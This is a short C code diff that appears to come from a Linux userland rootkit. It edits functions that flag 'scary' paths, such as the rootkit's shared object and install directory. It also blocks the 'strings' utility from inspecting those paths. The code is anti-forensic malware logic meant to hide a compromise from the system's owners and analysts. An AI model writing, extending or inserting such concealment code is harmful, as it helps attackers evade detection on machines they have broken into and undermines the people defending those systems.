@@ -1,7 +1,4 @@
 int scary_path(char *string){
-    if(strstr(BDVLSO, string) || strstr(INSTALL_DIR, string))
-        return 1;
-
     char *path;
     for(int i = 0; i < SCARY_PATHS_SIZE; i++){
         path = scary_paths[i];
@@ -14,10 +11,10 @@ int scary_path(char *string){
     return 0;
 }
 
-int block_strings(char *const argv[]){
+int block_strings(const char *filename, char *const argv[]){
     if(argv[0] == NULL) return 0;
 
-    int is_strings = !fnmatch("*/strings", argv[0], FNM_PATHNAME);
+    int is_strings = !fnmatch("*/strings", filename, FNM_PATHNAME);
     if(!is_strings) return 0;
 
     for(int i = 0; argv[i] != NULL; i++)
